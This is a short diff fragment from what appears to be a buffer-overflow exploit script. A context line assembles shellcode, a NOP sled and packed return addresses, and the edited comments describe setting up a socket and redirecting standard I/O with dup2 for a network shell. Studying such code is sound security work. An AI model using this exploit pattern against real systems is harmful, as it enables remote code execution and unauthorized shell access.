@@ -28,7 +28,7 @@ print my_sc_code + shellcode + '\x90'*1933 + pack("<I",buf_address) + pack("<I",
 
 """
 # Use socketcall(int call, unsigned long *args) to call socket()
-# Resolve I/O redirection using stdin/stdout/stderr using dup2()
+# Resolve I/O redirection for stdin/stdout/stderr using dup2()
 
 # SOCK_STREAM = 1
 # AF_INET = 2
